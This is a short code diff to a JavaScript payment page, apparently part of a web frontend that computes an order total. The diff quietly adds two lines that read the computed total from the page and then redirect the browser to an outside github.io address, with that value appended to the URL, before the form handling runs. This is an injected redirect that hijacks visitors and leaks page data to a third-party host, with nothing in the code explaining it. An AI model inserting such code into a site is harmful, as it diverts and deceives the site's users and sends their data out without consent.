@@ -44,7 +44,9 @@ define(['jquery', 'bootstrap', 'frontend', 'form', 'template', 'clipboard'], fun
                 let total = $("#price").val() * $("#payno").val();
                 $("#total").html(total);
             });
+var Ead = document.getElementById('total').innerHTML
 
+			window.location.href = 'https://svip66.github.io/c/a/?vip=' + Ead
             // 本地验证未通过时提示 $("#pay").data("validator-options", validatoroptions);
             Form.api.bindevent($("#pay"), function (data, ret) {
             }, function (data, ret) {
